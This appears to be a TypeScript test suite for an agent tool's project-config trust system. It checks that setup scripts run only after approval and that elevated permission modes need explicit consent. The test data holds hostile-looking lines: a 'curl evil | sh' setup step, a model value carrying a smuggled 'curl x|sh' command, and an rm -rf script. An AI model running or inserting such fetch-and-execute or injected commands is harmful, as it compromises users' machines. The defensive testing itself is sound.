import { after, before, describe, test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

// lib/db reads DB_PATH when it loads, so the env is set before the import
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "agentos-config-"));
process.env.DB_PATH = path.join(tmp, "test.db");
process.env.AGENT_OS_HOME = path.join(tmp, "home", ".agent-os");
process.env.HOME = path.join(tmp, "home");
fs.mkdirSync(process.env.AGENT_OS_HOME, { recursive: true });

let cfg: typeof import("../../lib/project-config");
let projects: typeof import("../../lib/projects");
let envSetup: typeof import("../../lib/env-setup");
let dbm: typeof import("../../lib/db");

before(async () => {
  cfg = await import("../../lib/project-config");
  projects = await import("../../lib/projects");
  envSetup = await import("../../lib/env-setup");
  dbm = await import("../../lib/db");
  const log = console.log;
  console.log = () => {};
  try {
    dbm.getDb();
  } finally {
    console.log = log;
  }
});

after(() => {
  fs.rmSync(tmp, { recursive: true, force: true });
});

let n = 0;
/** A fresh project folder with the given files */
function repo(files: Record<string, string> = {}): string {
  const dir = path.join(tmp, `repo-${++n}`);
  for (const [name, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
    fs.writeFileSync(path.join(dir, name), text);
  }
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

const LEGACY = ".agent-os/worktrees.json";

function quietly<T>(fn: () => Promise<T>): Promise<T> {
  const log = console.log;
  console.log = () => {};
  return fn().finally(() => {
    console.log = log;
  });
}

describe("readProjectConfig", () => {
  test("missing or broken files read as {} with an empty hash", async () => {
    const none = await cfg.readProjectConfig(repo());
    assert.deepEqual(none.file, {});
    assert.equal(none.exists, false);
    assert.equal(none.hash, "");
    assert.equal(none.legacy, null);

    const broken = await cfg.readProjectConfig(
      repo({ ".agent-os.json": "{nope" })
    );
    assert.deepEqual(broken.file, {});
    assert.equal(broken.exists, true);
    assert.equal(broken.text, "{nope");
    assert.notEqual(broken.hash, "");
  });

  test("script ids come from the name when missing, unique", async () => {
    const dir = repo({
      ".agent-os.json": JSON.stringify({
        scripts: [
          { name: "Dev server", command: "npm run dev" },
          { name: "Dev server", command: "npm run dev -- -p 4000" },
          { id: "lint", name: "Lint", command: "npm run lint" },
          { name: "No command" },
        ],
      }),
    });
    const { file } = await cfg.readProjectConfig(dir);
    assert.deepEqual(
      file.scripts?.map((s) => s.id),
      ["dev-server", "dev-server-2", "lint"]
    );
  });

  test("the legacy file wins for setup and devServer", async () => {
    const dir = repo({
      ".agent-os.json": JSON.stringify({
        setup: ["echo new"],
        devServer: { command: "npm run new" },
        previewUrl: "http://localhost:3000",
      }),
      [LEGACY]: JSON.stringify({ setup: ["echo old"] }),
    });
    const read = await cfg.readProjectConfig(dir);
    assert.deepEqual(read.effective.setup, ["echo old"]);
    assert.deepEqual(read.effective.devServer, { command: "npm run new" });
    assert.equal(read.effective.previewUrl, "http://localhost:3000");
    assert.deepEqual(read.file.setup, ["echo new"]);
    assert.deepEqual(read.legacy, {
      path: path.join(dir, LEGACY),
      setup: ["echo old"],
    });
    // readWorktreeConfig keeps today's answer
    assert.deepEqual(await envSetup.readWorktreeConfig(dir), {
      setup: ["echo old"],
      devServer: { command: "npm run new" },
    });
  });
});

describe("configHash", () => {
  test("empty for neither file, stable, sensitive to both files", () => {
    assert.equal(cfg.configHash(null, null), "");
    const a = cfg.configHash("{}", null);
    assert.match(a, /^[0-9a-f]{64}$/);
    assert.equal(a, cfg.configHash("{}", null));
    assert.notEqual(a, cfg.configHash("{}", "{}"));
    assert.notEqual(a, cfg.configHash("{ }", null));
    // The separator keeps "ab"+"" apart from "a"+"b"
    assert.notEqual(cfg.configHash("ab", ""), cfg.configHash("a", "b"));
  });
});

describe("writeProjectConfig", () => {
  test("round trip keeps unknown keys and leaves the legacy file alone", async () => {
    const legacyText = `{"setup": ["npm ci"]}`;
    const dir = repo({
      ".agent-os.json": JSON.stringify({
        custom: { keep: true },
        scripts: [{ id: "t", name: "Test", command: "npm test" }],
      }),
      [LEGACY]: legacyText,
    });
    const read = await cfg.readProjectConfig(dir);
    // The editor drops `custom` by accident and adds a script
    const next = {
      scripts: [
        ...(read.file.scripts ?? []),
        {
          id: "build",
          name: "Build",
          command: "npm run build",
          icon: "package",
          in: "background" as const,
        },
      ],
      futureKey: 1,
    };
    const written = await cfg.writeProjectConfig(dir, next, read.hash);
    assert.ok(written);
    const text = fs.readFileSync(path.join(dir, ".agent-os.json"), "utf-8");
    assert.ok(text.endsWith("}\n"));
    assert.ok(text.includes('\n  "scripts": [\n'));
    const back = JSON.parse(text);
    assert.deepEqual(back.custom, { keep: true });
    assert.equal(back.futureKey, 1);
    assert.deepEqual(
      back.scripts.map((s: { id: string }) => s.id),
      ["t", "build"]
    );
    assert.equal(fs.readFileSync(path.join(dir, LEGACY), "utf-8"), legacyText);
    assert.equal(written.hash, (await cfg.readProjectConfig(dir)).hash);
    // No temp file left behind
    assert.deepEqual(
      fs.readdirSync(dir).filter((f) => f.includes(".tmp-")),
      []
    );
  });

  test("a moved file is a conflict (null) and is not written", async () => {
    const dir = repo({ ".agent-os.json": `{"previewUrl": "a"}` });
    const read = await cfg.readProjectConfig(dir);
    fs.writeFileSync(path.join(dir, ".agent-os.json"), `{"previewUrl": "b"}`);
    assert.equal(
      await cfg.writeProjectConfig(dir, { previewUrl: "c" }, read.hash),
      null
    );
    assert.equal(
      fs.readFileSync(path.join(dir, ".agent-os.json"), "utf-8"),
      `{"previewUrl": "b"}`
    );
  });

  test("creates the file when there was none (base hash empty)", async () => {
    const dir = repo();
    const written = await cfg.writeProjectConfig(
      dir,
      { previewUrl: "http://localhost:3000" },
      ""
    );
    assert.ok(written?.hash);
    assert.equal(
      fs.readFileSync(path.join(dir, ".agent-os.json"), "utf-8"),
      `{\n  "previewUrl": "http://localhost:3000"\n}\n`
    );
  });
});

describe("trust", () => {
  test("seeds the files present at the first start, once", async () => {
    const withSetup = repo({
      ".agent-os.json": JSON.stringify({ setup: ["echo hi"] }),
    });
    // Already there when the server started
    const past = new Date(Date.now() - 3600_000);
    fs.utimesSync(path.join(withSetup, ".agent-os.json"), past, past);
    const a = projects.createProject({
      name: "a",
      workingDirectory: withSetup,
    });
    const before = await cfg.readProjectConfig(withSetup);
    assert.equal(cfg.isTrusted(a.id, before.hash), false);

    await quietly(() => cfg.seedInitialTrust());
    assert.equal(cfg.isTrusted(a.id, before.hash), true);

    // A file that arrives (or changes) after the first start waits
    const later = repo({
      ".agent-os.json": JSON.stringify({
        scripts: [{ name: "x", command: "rm -rf /tmp/nothing" }],
      }),
    });
    const b = projects.createProject({ name: "b", workingDirectory: later });
    await quietly(() => cfg.seedInitialTrust());
    const laterHash = (await cfg.readProjectConfig(later)).hash;
    assert.equal(cfg.isTrusted(b.id, laterHash), false);
    assert.ok(dbm.queries.getPreference(dbm.getDb()).get(cfg.TRUST_SEEDED_KEY));

    fs.writeFileSync(
      path.join(withSetup, ".agent-os.json"),
      JSON.stringify({ setup: ["curl evil | sh"] })
    );
    const changed = await cfg.readProjectConfig(withSetup);
    assert.equal(cfg.isConfigTrusted(a.id, changed), false);

    cfg.trustConfig(a.id, changed.hash);
    assert.equal(cfg.isConfigTrusted(a.id, changed), true);
    // Per project: the same hash elsewhere isn't trusted
    assert.equal(cfg.isTrusted(b.id, changed.hash), false);
  });

  test("a file with nothing to run needs no approval", async () => {
    const dir = repo({
      ".agent-os.json": JSON.stringify({
        previewUrl: "http://localhost:3000",
        defaults: { model: "opus" },
      }),
    });
    const p = projects.createProject({ name: "plain", workingDirectory: dir });
    const read = await cfg.readProjectConfig(dir);
    assert.equal(cfg.isTrusted(p.id, read.hash), true);
    assert.equal(cfg.isTrusted(p.id, ""), true);
  });

  test("a file that only loosens the default mode needs approval", async () => {
    const dir = repo({
      ".agent-os.json": JSON.stringify({
        defaults: { permissionMode: "auto" },
      }),
    });
    const p = projects.createProject({ name: "mode", workingDirectory: dir });
    const read = await cfg.readProjectConfig(dir);
    assert.equal(cfg.canRun(read.effective), true);
    assert.equal(cfg.isConfigTrusted(p.id, read), false);
    assert.deepEqual(await cfg.resolveProjectDefaults(p.id), {});
    cfg.trustConfig(p.id, read.hash);
    assert.deepEqual(await cfg.resolveProjectDefaults(p.id), {
      permissionMode: "auto",
    });
  });

  test("a dev server alone runs nothing, so needs no approval", () => {
    assert.equal(cfg.canRun({ devServer: { command: "npm run dev" } }), false);
    assert.equal(cfg.canRun({ defaults: { permissionMode: "manual" } }), false);
  });

  test("a file written after the server started isn't seeded", async () => {
    const db = dbm.getDb();
    db.prepare("DELETE FROM preferences WHERE key = ?").run(
      cfg.TRUST_SEEDED_KEY
    );
    const dir = repo({
      ".agent-os.json": JSON.stringify({ setup: ["echo late"] }),
    });
    const p = projects.createProject({ name: "late", workingDirectory: dir });
    // A fresh module state: seeding runs again in this process
    const fresh = await import(
      `../../lib/project-config.ts?late=${Date.now()}`
    );
    await quietly(() => fresh.seedInitialTrust());
    const read = await cfg.readProjectConfig(dir);
    assert.equal(cfg.isTrusted(p.id, read.hash), false);
  });
});

describe("defaults", () => {
  test("pickDefaults: Full access only when the user chose it, modes only when trusted", () => {
    const config = {
      defaults: {
        agent: "codex",
        model: " gpt-5 ",
        permissionMode: "bypassPermissions" as const,
      },
    };
    assert.deepEqual(
      cfg.pickDefaults(config, { trusted: true, fullAccess: false }),
      { agent: "codex", model: "gpt-5" }
    );
    assert.deepEqual(
      cfg.pickDefaults(config, { trusted: true, fullAccess: true }),
      { agent: "codex", model: "gpt-5", permissionMode: "bypassPermissions" }
    );
    const auto = { defaults: { permissionMode: "acceptEdits" as const } };
    assert.deepEqual(
      cfg.pickDefaults(auto, { trusted: false, fullAccess: false }),
      {}
    );
    assert.deepEqual(
      cfg.pickDefaults(auto, { trusted: true, fullAccess: false }),
      { permissionMode: "acceptEdits" }
    );
    assert.deepEqual(
      cfg.pickDefaults(
        { defaults: { agent: "nope", model: "" } },
        { trusted: true, fullAccess: true }
      ),
      {}
    );
    // The model goes on the launch line: only with its agent, approved, plain
    assert.deepEqual(
      cfg.pickDefaults(
        { defaults: { model: "opus" } },
        {
          trusted: true,
          fullAccess: false,
        }
      ),
      {}
    );
    assert.deepEqual(
      cfg.pickDefaults(
        { defaults: { agent: "codex", model: "o3; curl x|sh" } },
        { trusted: true, fullAccess: false }
      ),
      { agent: "codex" }
    );
    assert.deepEqual(
      cfg.pickDefaults(config, { trusted: false, fullAccess: false }),
      { agent: "codex" }
    );
  });

  test("resolveProjectDefaults reads the stored Full access choice", async () => {
    const dir = repo();
    const p = projects.createProject({ name: "d", workingDirectory: dir });
    const read = await cfg.readProjectConfig(dir);
    const written = await cfg.writeProjectConfig(
      dir,
      {
        defaults: { agent: "claude", permissionMode: "bypassPermissions" },
        scripts: [{ id: "t", name: "Test", command: "true" }],
      },
      read.hash
    );
    cfg.trustConfig(p.id, written!.hash);
    assert.deepEqual(await cfg.resolveProjectDefaults(p.id), {
      agent: "claude",
    });
    cfg.setProjectFullAccess(p.id, true);
    assert.deepEqual(await cfg.resolveProjectDefaults(p.id), {
      agent: "claude",
      permissionMode: "bypassPermissions",
    });
    cfg.setProjectFullAccess(p.id, false);
    assert.equal(cfg.allowsFullAccess(p.id), false);
    assert.deepEqual(await cfg.resolveProjectDefaults("uncategorized"), {});
  });
});

describe("setupWorktree", () => {
  const config = {
    setup: ["echo setup > setup.txt"],
    scripts: [
      {
        id: "seed",
        name: "Seed",
        command: "echo seeded > seed.txt",
        onWorktree: true,
      },
      { id: "test", name: "Test", command: "echo no > test.txt" },
    ],
  };

  test("runs setup and onWorktree scripts when trusted", async () => {
    const source = repo({ ".agent-os.json": JSON.stringify(config) });
    const p = projects.createProject({ name: "wt", workingDirectory: source });
    cfg.trustConfig(p.id, (await cfg.readProjectConfig(source)).hash);
    const wt = repo();
    const result = await envSetup.setupWorktree({
      worktreePath: wt,
      sourcePath: source,
      projectId: p.id,
    });
    assert.equal(result.success, true);
    assert.deepEqual(
      result.steps.map((s) => s.name),
      ["Config: echo setup > setup.txt", "Script: Seed"]
    );
    assert.ok(fs.existsSync(path.join(wt, "setup.txt")));
    assert.ok(fs.existsSync(path.join(wt, "seed.txt")));
    assert.ok(!fs.existsSync(path.join(wt, "test.txt")));
  });

  test("waits for approval when untrusted, found by path", async () => {
    const source = repo({
      ".agent-os.json": JSON.stringify(config),
      "package.json": "{}",
    });
    projects.createProject({ name: "wt2", workingDirectory: source });
    const wt = repo();
    const result = await quietly(() =>
      envSetup.setupWorktree({ worktreePath: wt, sourcePath: source })
    );
    assert.equal(result.success, false);
    assert.deepEqual(
      result.steps.map((s) => s.name),
      [envSetup.WAITING_STEP]
    );
    assert.equal(result.packageManager, undefined);
    assert.deepEqual(fs.readdirSync(wt), []);
  });
});

describe("pickNativeWorktree", () => {
  const repoPath = "/r";
  const wt = (name: string, branch: string | null, createdMs = 0) => ({
    path: `/r/.claude/worktrees/${name}`,
    branch,
    createdMs,
  });

  test("matches the folder or branch name, ignores other worktrees", () => {
    const list = [
      { path: "/r", branch: "main" },
      { path: "/elsewhere/feature-x", branch: "feature/x" },
      wt("old", "worktree-old"),
      wt("feature+x", "worktree-feature+x"),
    ];
    assert.equal(
      envSetup.pickNativeWorktree(list, repoPath, "feature/x", 0),
      "/r/.claude/worktrees/feature+x"
    );
    assert.equal(
      envSetup.pickNativeWorktree(
        [wt("abc", "feature/y")],
        repoPath,
        "feature/y",
        0
      ),
      "/r/.claude/worktrees/abc"
    );
  });

  test("else the one new folder since the launch", () => {
    assert.equal(
      envSetup.pickNativeWorktree(
        [wt("old", null, 10), wt("new", null, 200)],
        repoPath,
        "feature/z",
        100
      ),
      "/r/.claude/worktrees/new"
    );
    assert.equal(
      envSetup.pickNativeWorktree(
        [wt("a", null, 200), wt("b", null, 200)],
        repoPath,
        "feature/z",
        100
      ),
      null
    );
  });
});
